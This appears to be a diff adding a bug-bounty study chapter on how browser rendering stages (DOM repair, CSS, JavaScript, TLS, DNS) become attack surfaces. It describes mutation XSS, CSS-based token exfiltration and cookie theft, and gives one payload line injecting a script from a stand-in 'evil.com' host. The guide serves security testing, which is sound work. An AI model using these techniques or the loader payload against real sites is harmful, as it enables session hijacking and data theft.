@@ -1,0 +1,58 @@
+🖥️ Chapter 3 – How Browsers Work: Exploiting the Renderer’s Weaknesses
+A bug bounty hunter doesn’t just read HTML—they weaponize the browser’s own rendering pipeline. Here’s how every stage from DOM construction to JavaScript execution can be turned into an attack surface.
+
+1. The DOM – Where Robust Parsing Creates mXSS
+Browsers are forgiving of malformed HTML: they close tags, insert missing ones, and ignore garbage. This well-intentioned behavior creates mutation XSS (mXSS).
+
+Attack vector: Inject a string that looks harmless when sanitized, but after the browser’s own DOM repair, it becomes an executable <script>.
+
+Hunt tip: Fuzz every input that gets reflected inside HTML with dangling tags, weird attribute quotes, and mixed encodings. If the server filters <script> but the browser later restructures the DOM into something dangerous, you’ve got a bug.
+
+2. CSS – More Than Just Pretty Rectangles
+Styling information can be a delivery mechanism for attacks.
+
+CSS injection → data exfiltration: If you can inject arbitrary CSS, you can use attribute selectors (input[value^="a"]) and background URLs to steal CSRF tokens or passwords character by character.
+
+Selector collisions: Conflicting styles might hide warning messages or overlay phishing forms without any JavaScript.
+
+Acid3 reference: The browser’s struggle to render complex CSS correctly is a reminder—quirks in older or less common browsers might leave a target exploitable even when modern Chrome seems safe.
+
+3. JavaScript – Locked Down, Still Deadly
+The browser sandbox severely restricts JavaScript (no file system, no OS calls, no process creation), but a successful XSS still gives an attacker everything they need.
+
+What’s allowed vs. what you can abuse:
+
+Sandbox permission	Attacker’s payoff
+Read/manipulate current page’s DOM	Keylogging (capture input events), form hijacking, altering payment details, stealing displayed credit card data.
+Make HTTP calls on behalf of the user	CSRF‑style actions from inside the victim’s origin, exfiltration of cookies/localStorage to an attacker’s server.
+Open new pages or redirect (only after user action)	Phishing overlays, silent redirect chains if combined with clickjacking.
+Write to browser history	History manipulation for social engineering or tracking.
+Request geolocation / notifications	Spam the user with permission prompts, trick them into granting access, then exfiltrate location.
+Execution timing matters:
+
+defer attribute: Scripts without defer run as soon as the <script> tag is parsed. If you can inject a script before the DOM is fully built, you control what happens next—before any security scripts load.
+
+Inline injection → payload loader: Even a single injected character can be turned into a full exploit by inserting <script src="//evil.com/poison.js">. Your tiny foothold loads the rest.
+
+4. The Full Login Flow – A Map of Weak Points
+The chapter walks through a user logging into Amazon. As a hunter, treat this chain as a checklist of where things go wrong:
+
+DNS resolution: Cache poisoning or DNS rebinding may let you serve malicious content from the target’s domain.
+
+TCP/TLS handshake: Test for weak ciphers, missing certificate pinning, or mixed content (HTTP scripts on an HTTPS page).
+
+HTTP response (cookie set): Are cookies marked Secure, HttpOnly, SameSite? A missing flag is an invitation for hijacking.
+
+DOM rendering: Look for DOM‑based XSS where URL fragments or document.referrer are placed unsafely into the DOM.
+
+Subsequent requests: Does the application rely on only cookies for authentication? No additional token checks? A stolen cookie means full account takeover.
+
+5. Browser’s Hidden Helpers – Attack the Pre‑Render Phase
+Before the user sees a single pixel, the browser resolves DNS, verifies certificates, and negotiates encryption. Each of these is an independent target:
+
+HSTS misconfiguration: If strict transport security isn’t enforced, perform a protocol downgrade attack.
+
+Certificate errors: Users often click through warnings—social engineering to accept your self‑signed certificate gives you a perfect man‑in‑the‑middle position.
+
+DNS prefetch / preconnect: These features can leak the user’s browsing intentions; a rogue script on a compromised page could harvest this.
+
